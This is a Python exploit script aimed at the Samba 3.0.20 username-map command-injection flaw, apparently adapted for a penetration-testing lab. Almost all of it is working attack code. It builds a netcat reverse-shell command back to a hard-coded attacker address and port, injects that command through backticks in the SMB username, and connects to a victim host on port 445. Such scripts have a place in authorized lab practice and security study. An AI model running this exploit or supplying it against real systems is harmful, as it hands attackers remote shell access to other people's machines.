#!/usr/bin/python3
# Modified from: https://raw.githubusercontent.com/NPTG24/Exploit-smb-3.0.20/main/smb-usermap.py
# Setup:
# ❯ python3 -m venv venv
# ❯ source venv/bin/activate
# ❯ pip install smb
# Usage:
# smb-usermap.py <VICTIM_IP>
# Reference - https://www.exploit-db.com/exploits/16320/

# change as required
LHOST = "10.10.14.8"
LPORT = 9000

from smb.SMBConnection import SMBConnection
import random, string
from smb import smb_structs

smb_structs.SUPPORT_SMB2 = False
import sys

if len(sys.argv) < 2:
    print("\nUsage: python3 " + sys.argv[0] + " <VICTIM_IP>\n")
    sys.exit()

# Shellcode:
# msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.8 LPORT=9000 -f raw
cmd = f"mkfifo /tmp/b; nc {LHOST} {LPORT} 0</tmp/b | /bin/sh >/tmp/b 2>&1; rm /tmp/b"

username = f"/=` nohup {cmd}`"
password = ""
my_name = "derp"
remote_name = "derp"
con = SMBConnection(username, password, my_name, remote_name, use_ntlm_v2=False)
assert con.connect(sys.argv[1], 445)
